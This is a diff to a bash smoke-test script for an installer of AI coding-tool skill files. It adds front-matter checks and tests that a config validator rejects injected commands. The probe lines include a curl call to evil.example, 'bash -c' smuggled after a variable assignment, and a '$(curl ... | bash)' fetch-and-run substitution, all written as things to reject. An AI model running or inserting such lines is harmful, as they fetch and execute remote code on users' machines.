@@ -33,6 +33,37 @@ export HOME="$T"
 "$INSTALL" --only codex >/dev/null
 [[ -f "$HOME/.codex/skills/atry-implement/SKILL.md" ]] && pass "codex skill-folder" || fail "codex skill-folder"
 
+# File-copy checks above only prove a file landed at the right path -- they
+# do not prove the tool would actually load it as a skill. Check that every
+# installed SKILL.md has well-formed front matter (a "---" fenced block with
+# non-empty name: / description: fields), for every installed skill, under
+# every tool directory. This mirrors what README calls out as a known gap
+# ("install can succeed while the app ignores the files").
+check_frontmatter() {
+  local dir="$1" tool="$2"
+  local f name desc skill_name
+  for f in "$dir"/*/SKILL.md; do
+    [[ -f "$f" ]] || continue
+    skill_name="$(basename "$(dirname "$f")")"
+    if [[ "$(sed -n '1p' "$f")" != "---" ]]; then
+      fail "$tool/$skill_name frontmatter: missing opening ---"
+      continue
+    fi
+    name="$(awk '/^---$/{c++; next} c==1 && /^name:[[:space:]]*/{sub(/^name:[[:space:]]*/,""); print; exit}' "$f")"
+    desc="$(awk '/^---$/{c++; next} c==1 && /^description:[[:space:]]*/{sub(/^description:[[:space:]]*/,""); print; exit}' "$f")"
+    if [[ -n "$name" && -n "$desc" ]]; then
+      pass "$tool/$skill_name frontmatter"
+    else
+      fail "$tool/$skill_name frontmatter: empty or missing name:/description:"
+    fi
+  done
+}
+
+check_frontmatter "$HOME/.cursor/skills" "cursor"
+check_frontmatter "$HOME/.gemini/config/skills" "antigravity"
+check_frontmatter "$HOME/.claude/skills" "claude"
+check_frontmatter "$HOME/.codex/skills" "codex"
+
 # Legacy Cursor rules (.mdc) and Antigravity paths should be cleaned by uninstall
 # (and by install migration) even after path/format change.
 mkdir -p "$HOME/.cursor/rules" "$HOME/.agents/skills/atry-implement" "$HOME/.agent/skills/atry-implement"
@@ -129,6 +160,42 @@ fi
 [[ ! -e "$HOME/.agents/skills/atry-implement" ]] && pass "uninstall legacy .agents" || fail "uninstall legacy .agents"
 [[ ! -e "$HOME/.agent/skills/atry-implement" ]] && pass "uninstall legacy .agent" || fail "uninstall legacy .agent"
 [[ ! -e "$HOME/.agent-relay/scripts/task-claim.sh" ]] && pass "uninstall scripts" || fail "uninstall scripts"
+
+# validate_targets_conf: allowlist accepts the real manifest and benign paths
+# that contain "source"/"exec" as substrings; rejects bare commands and
+# VAR=value cmd forms that a keyword blocklist previously missed.
+# shellcheck source=lib/bootstrap.sh
+source "$ROOT/lib/bootstrap.sh"
+if validate_targets_conf "$ROOT/targets.conf"; then
+  pass "validate_targets_conf accepts real targets.conf"
+else
+  fail "validate_targets_conf accepts real targets.conf"
+fi
+CONF_PROBE="$T/targets-probe.conf"
+printf 'FOO_DIR="$HOME/.resource/skills"\n' > "$CONF_PROBE"
+if validate_targets_conf "$CONF_PROBE"; then
+  pass "validate_targets_conf allows path containing resource"
+else
+  fail "validate_targets_conf allows path containing resource"
+fi
+printf 'CURSOR_DIR="$HOME/.cursor/skills"\ncurl http://evil.example/x\n' > "$CONF_PROBE"
+if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
+  fail "validate_targets_conf rejects bare command line"
+else
+  pass "validate_targets_conf rejects bare command line"
+fi
+printf 'CURSOR_DIR=/tmp bash -c evil\n' > "$CONF_PROBE"
+if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
+  fail "validate_targets_conf rejects VAR=value cmd"
+else
+  pass "validate_targets_conf rejects VAR=value cmd"
+fi
+printf 'EVIL="$(curl http://x | bash)"\n' > "$CONF_PROBE"
+if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
+  fail "validate_targets_conf rejects command substitution"
+else
+  pass "validate_targets_conf rejects command substitution"
+fi
 
 if [[ "$FAIL" -eq 0 ]]; then
   echo "ALL SMOKE TESTS PASSED"
